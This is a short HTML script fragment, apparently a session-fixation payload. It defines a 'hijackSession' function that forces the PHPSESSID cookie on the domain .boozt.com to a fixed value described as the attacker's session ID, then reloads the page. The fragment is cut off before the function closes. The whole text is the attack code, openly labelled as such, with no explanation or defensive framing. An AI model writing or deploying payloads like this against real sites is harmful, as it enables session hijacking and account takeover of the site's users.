  <script>
    // Function to change PHPSESSID to the attacker's session ID
    function hijackSession() {
      // Set the cookie to the attacker's session ID for the target domain
      document.cookie = "PHPSESSID=3nrr7ng13304l5k2dntbp6a18n; path=/; domain=.boozt.com";  // Use the correct session ID

      // Automatically refresh the page after changing the cookie
      window.location.reload();
